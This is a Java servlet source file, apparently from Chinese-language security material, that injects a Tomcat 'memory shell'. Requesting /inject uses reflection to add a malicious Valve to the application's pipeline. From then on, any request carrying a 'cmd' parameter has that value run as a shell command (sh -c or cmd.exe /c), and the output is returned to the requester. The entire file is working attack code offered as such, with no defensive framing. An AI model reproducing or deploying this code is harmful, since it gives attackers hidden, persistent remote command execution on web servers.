import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardPipeline;
import org.apache.catalina.valves.ValveBase;
import org.apache.catalina.core.ContainerBase;

@WebServlet("/inject")
public class EvilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            // 获取 org.apache.catalina.connector.Request
            Field requestField = request.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            final Request req = (Request) requestField.get(request);

            // 获取 StandardContext
            StandardContext standardContext = (StandardContext) req.getContext();

            // 通过反射获取 StandardPipeline
            Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
            pipelineField.setAccessible(true);
            StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);

            // 创建恶意 Valve
            ValveBase evilValve = new ValveBase() {
                @Override
                public void invoke(Request request, Response response) throws ServletException, IOException {
                    if (request.getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        response.setCharacterEncoding("GBK");
                        PrintWriter out = response.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }
                    this.getNext().invoke(request, response);
                }
            };

            // 添加恶意 Valve
            evilStandardPipeline.addValve(evilValve);

            // 输出注入成功信息
            response.setContentType("text/html;charset=UTF-8");
            PrintWriter out = response.getWriter();
            out.println("inject success");
            out.flush();
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
            response.getWriter().println("inject failed: " + e.getMessage());
        }
    }
}
